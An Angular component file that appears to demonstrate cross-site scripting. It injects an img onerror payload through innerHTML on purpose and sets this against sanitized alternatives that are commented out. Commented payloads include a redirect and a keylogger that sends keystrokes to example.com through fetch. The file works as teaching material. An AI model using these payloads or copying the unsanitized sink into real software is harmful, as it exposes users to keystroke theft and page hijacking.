import {
  Component,
  AfterViewInit,
  ViewChild,
  ElementRef,
  Renderer2,
  SecurityContext,
} from "@angular/core";
import { DomSanitizer } from "@angular/platform-browser";

@Component({
  selector: "app-home",
  templateUrl: "home.page.html",
  styleUrls: ["home.page.scss"],
})
export class HomePage implements AfterViewInit {
  public maliciousString: string;

  @ViewChild("userContent", { static: false }) userContent: ElementRef;

  constructor(private renderer: Renderer2, private sanitizer: DomSanitizer) {
    this.maliciousString = `<img src=nonexistentimage onerror="alert('Hello there.')" />`;
    // this.maliciousString = `<img src=nonexistentimage onerror="window.location='https://www.google.com'" />`;
    // this.maliciousString = `<img src=nonexistentimage onerror="document.onkeypress=function(e){console.log(e.key)}" />`;
    // this.maliciousString = `<img src=nonexistentimage onerror="var keys = [];setInterval(function(){var keyString=keys.join('');fetch('https://example.com/keylogger?keys=' + keyString)}, 10000);}document.onkeypress=function(e){keys.push(e.key);" />`;
  }

  ngAfterViewInit() {
    // DANGER - Vulnerable to XSS
    this.renderer.setProperty(this.userContent.nativeElement, "innerHTML", this.maliciousString);

    // // Safe
    // this.renderer.setProperty(
    //   this.userContent.nativeElement,
    //   "innerHTML",
    //   this.sanitizer.sanitize(SecurityContext.HTML, this.maliciousString)
    // );

    // // DANGER - Vulnerable to XSS
    // this.userContent.nativeElement.innerHTML = this.maliciousString;

    // // Safe
    // this.userContent.nativeElement.innerHTML = this.sanitizer.sanitize(
    //   SecurityContext.HTML,
    //   this.maliciousString
    // );
  }
}
